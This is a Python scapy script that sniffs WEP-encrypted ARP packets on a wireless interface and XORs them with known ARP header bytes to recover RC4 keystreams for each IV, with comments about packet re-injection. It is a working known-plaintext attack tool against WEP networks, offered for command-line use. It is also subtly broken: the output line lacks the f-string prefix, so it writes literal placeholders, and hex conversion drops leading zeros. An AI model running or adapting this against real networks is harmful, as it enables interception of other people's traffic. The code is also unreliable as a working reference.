# NOTE
# When re-injecting, it is possible the NIC is not sniffing, not sure
# 50% chance IV repeats after 5000 packets

from scapy.all import *
import binascii
from argparse import ArgumentParser as AP

# Global variables
ARP_REQUEST_PATTERN = 'aaaa0300000008060001080006040001'
ARP_RESPONSE_PATTERN = 'aaaa0300000008060001080006040002'
keystreams = {}
arp_packets_captured = 0
iface = 'wlan0'


def expand(x):
    yield x.name
    while x.payload:
        x = x.payload
        yield x.name


def arp_monitor_callback(pkt):
    global arp_packets_captured
    global iface
    if len(pkt) == 112 or len(pkt) == 110:
        # print(pkt[RadioTap].len)
        layers = list(expand(pkt))
        if '802.11 WEP packet' in layers:
            if arp_packets_captured % 50 == 0:
                print(arp_packets_captured)
            src_address = pkt.addr2
            bssid = pkt.addr1
            iv_bytes = binascii.hexlify(pkt.iv)
            iv_hexstring = iv_bytes.decode('UTF-8')
            data_bytes = binascii.hexlify(pkt.wepdata)
            data_hexstring = data_bytes.decode('UTF-8')[:32]
            data_dec = int(data_hexstring, 16)

            # ARP request
            if pkt.addr3 == 'ff:ff:ff:ff:ff:ff':
                xor = data_dec ^ int(ARP_REQUEST_PATTERN, 16)
                keystream_first_bytes = hex(xor)[2:]
                if iv_hexstring not in keystreams:
                    arp_packets_captured += 1
                    keystreams[iv_hexstring] = keystream_first_bytes
            # ARP response
            else:
                xor = data_dec ^ int(ARP_RESPONSE_PATTERN, 16)
                keystream_first_bytes = hex(xor)[2:]
                if iv_hexstring not in keystreams:
                    arp_packets_captured += 1
                    keystreams[iv_hexstring] = keystream_first_bytes


def stop_condition(pkt):
    global arp_packets_captured
    if arp_packets_captured > 1000: return True


if __name__ == "__main__":
    parser = AP(description="Capture ARP packets and exctract the RC4 keystream.")
    parser.add_argument("-i", "--interface",help="interface to sniff and send packets from")
    args = parser.parse_args()
    if args.interface is None:
        print("[-] Please specify all program arguments... run `python3 sniffer.py -h` for help")
        exit(1)
    iface = args.interface

    sniff(iface=iface, prn=arp_monitor_callback, store=0, stop_filter=stop_condition)
    
    # scapy_cap = rdpcap('packets/arp_packet_dump.pcap')
    # for packet in scapy_cap:
    #     arp_monitor_callback(packet)

    with open('keystreams.txt', 'w') as f:
        print(len(keystreams))
        for key, value in keystreams.items():
            # print(f'{key} - {value}')
            f.write('{key}:{value}')